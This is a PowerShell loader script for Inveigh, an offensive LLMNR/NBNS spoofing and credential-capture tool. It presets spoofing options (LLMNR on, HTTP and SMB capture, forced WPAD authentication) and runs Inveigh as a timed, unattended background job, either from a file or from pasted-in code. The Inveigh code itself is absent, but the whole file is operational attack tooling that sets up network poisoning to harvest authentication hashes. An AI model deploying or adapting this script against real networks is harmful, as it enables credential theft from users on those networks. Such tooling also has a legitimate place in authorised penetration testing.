<#
.SYNOPSIS
Inveigh Loader provides additional options for running Inveigh as an unattended payload.

.DESCRIPTION
Inveigh Loader can load Inveigh with set parameters and stop execution after specified amount of time. Inveigh can be either loaded as a separate script or through a scriptblock embedded within this script. If the scriptblock method is selected, the current Inveigh.ps1 code must be copied into the $inveigh_scriptblock below. This is a basic version, additional features will be added.
#>

# Inveigh loader parameters
$run_length = 1 # Set the number of minutes Inveigh will run
$start_job_method = "filepath" # Set the Job-Start method. filepath,scriptblock

# Inveigh parameters - refer to Inveigh.ps1 for details
$IP = ""
$SpooferIP = ""
$HTTP = "Y"
$HTTPS = "N"
$SMB = "Y"
$LLMNR = "Y"
$NBNS = "N"
$NBNSTypes = @("20") # Format for multiples = @("00","20")
$Repeat = "Y"
$ForceWPADAuth = "Y"
$Output = "0"
$OutputDir = ""

if(-not($IP))
{ 
    $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
}

if(-not($SpooferIP))
{
    $SpooferIP = $IP  
}

if(-not($OutputDir))
{
    $OutputDir = $PWD.Path  
}

$inveigh_scriptblock =
{ # begin $inveigh_scriptblock - paste Inveigh.ps1 code below this line if using $start_job_method = "scriptblock"

} # end $inveigh_scriptblock

try
{
    if ($start_job_method -eq "filepath")
    {
        Start-Job -Name Inveigh -FilePath .\Inveigh.ps1 -ArgumentList $IP,$SpooferIP,$HTTP,$HTTPS,$SMB,$LLMNR,$NBNS,$NBNSTypes,$Repeat,$ForceWPADAuth,$Output,$OutputDir | Out-Null
    }
    elseif ($start_job_method -eq "scriptblock")
    {
        Start-Job -Name Inveigh -ScriptBlock $inveigh_scriptblock -ArgumentList $IP,$SpooferIP,$HTTP,$HTTPS,$SMB,$LLMNR,$NBNS,$NBNSTypes,$Repeat,$ForceWPADAuth,$Output,$OutputDir | Out-Null
    }
    else
    {
        throw "Invalid $start_job_method."
    }
    
    $run_timeout = new-timespan -Minutes $run_length
    $run_stopwatch = [diagnostics.stopwatch]::StartNew()
    
    while ($run_stopwatch.elapsed -lt $run_timeout)
    {
        Receive-Job -name Inveigh
    }

}
finally
{
    Stop-Job -name Inveigh
    Receive-Job -name Inveigh
    Remove-Job -name Inveigh
    write-warning "Inveigh Loader exited at $(Get-Date -format 's')"
}
